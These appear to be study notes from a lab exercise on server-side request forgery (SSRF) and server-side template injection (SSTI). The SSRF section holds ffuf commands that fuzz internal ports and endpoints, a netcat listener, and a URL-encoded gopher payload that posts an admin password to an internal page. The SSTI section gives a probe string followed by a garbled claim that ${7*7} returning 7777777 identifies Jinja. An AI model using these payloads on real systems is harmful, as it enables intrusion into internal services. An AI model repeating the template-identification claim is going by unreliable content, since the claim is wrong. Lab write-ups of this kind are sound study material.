# Server-Side Request Forgery (SSRF)
- http:// or https://
- file://
- gopher://
## Identifying
### Confirming SSRF
<img width="1552" height="264" alt="image" src="https://github.com/user-attachments/assets/911ee48e-dfa8-4b2a-b10c-a0917e32b726" />
It's possible to identifying with:
- Ping
<img width="1553" height="220" alt="image" src="https://github.com/user-attachments/assets/5c4e5f7a-e469-45b6-b280-594c981abe0e" />

```bash
nc -lnvp 8000
```
- Enter to the web page
<img width="1547" height="344" alt="image" src="https://github.com/user-attachments/assets/0fa1622a-6f63-474f-8435-1a9bbef16855" />

### Enumerating the System
```bash
ffuf -w /usr/share/wordlists/ports-1-65535.txt -u http://10.129.83.100 -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ&date=2024-01-01" -mr "Date is unavailable. Please choose a different date!"
```

## Explotation
### Accessing Restricted Endpoints
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```
### Local File Inclusion (LFI)
<img width="1550" height="570" alt="image" src="https://github.com/user-attachments/assets/51c4db5c-b35e-476e-bd00-4ed4702d60d2" />

### The gopher Protocol
<img width="1541" height="493" alt="image" src="https://github.com/user-attachments/assets/5ced41cb-99f5-46f8-88d7-d129874b5d3f" />

```bash
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

To create a payload in gopher, we have to use
```bash
python2.7 gopherus.py
```
## Blind
- Identify with netcat
- Identifying with the answer of the backend
Incorrect Payload
<img width="1544" height="236" alt="image" src="https://github.com/user-attachments/assets/b6b64736-060a-4aad-859b-4525a692923a" />

Correct Payload
<img width="1548" height="235" alt="image" src="https://github.com/user-attachments/assets/c90b3f91-67c3-4a14-8d3a-48bec9c2da05" />

# Server-side Template Injection (SSTI)
## Identifying 
```bash
${{<%[%'"}}%\.
```
- Identifying template
<img width="1440" height="943" alt="image" src="https://github.com/user-attachments/assets/a007c8e6-b48c-4d03-b55c-3a900cbb7de8" />

I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Template else if the answer is this 49 is a Twig Template
